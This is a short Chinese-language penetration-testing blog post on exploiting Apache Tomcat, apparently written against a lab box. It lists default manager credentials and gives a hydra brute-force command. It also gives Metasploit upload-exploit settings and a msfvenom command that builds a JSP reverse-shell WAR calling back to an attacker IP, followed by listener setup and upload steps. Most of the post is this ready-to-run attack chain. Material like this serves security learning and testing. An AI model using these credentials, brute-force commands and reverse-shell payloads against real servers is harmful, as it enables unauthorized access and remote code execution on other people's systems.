---
title: Apache Tomcat 漏洞利用
date: 2021/12/12
tags: [渗透测试,漏洞利用]
categories: 渗透测试
top_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_16.jpg
cover: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_16.jpg
---



# Apache Tomcat 漏洞利用

---

[参考链接1](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)

[参考链接2](https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/)

**通过对apache tomcat的枚举和利用，我们可以从中找出漏洞，然后得到shell**

- 在这里列举出两种情况，第一种情况是哦我们能够访问到/manager目录，第二种情况是我们不能访问到该目录

## 枚举

- 在 Tomcat6 之前的某些版本中，我们可以使用msf枚举用户：

```
msf> use auxiliary/scanner/http/tomcat_enum
```

- 常见的得到的用户名与密码是：

    - admin:admin

    - tomcat:tomcat

    - admin:<NOTHING>

    - admin:s3cr3t

    - tomcat:s3cr3t

    - admin:tomcat

- 当然，我们也可以使用hydra进行暴力破解

```
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

- 得到了用户名与密码后，我们就可以登录到 /manager/html下传输反向shell

## RCE

- 我们可以使用msf，当然有时候这个并不起效果

```
use exploit/multi/http/tomcat_mgr_upload
show options
set RHOSTS 
set RPORT 8080
set HttpPassword 
set HttpUsername 
set LHOST 
exploit
```

- 当我们使用msf没有用时，我们可以自己制造一个shell传输到网页上
- 创建一个msfvenom payload

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war
```

- 使用msf的监听模块进行监听（这有时候会收不到反弹回来的shell），或者使用nc监听端口

```
use exploit/multi/handler
show options
set payload java/jsp_shell_reverse_tcp
set LHOST 10.10.14.10
set LPORT 9999
exploit
```

- 完成这些后，我们将shell文件传输到web上，如果我们不能访问/manager/，那么就无法进行下一步
- 点击上传的文件在web中的地址，如果监听器没能收到shell，我们可以解压缩之前使用msfvenom创建的 .war 文件，将里面的  .jsp 文件上传，并且访问其网络链接

[点击该链接，说的很全面，但是要按情况选择](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)

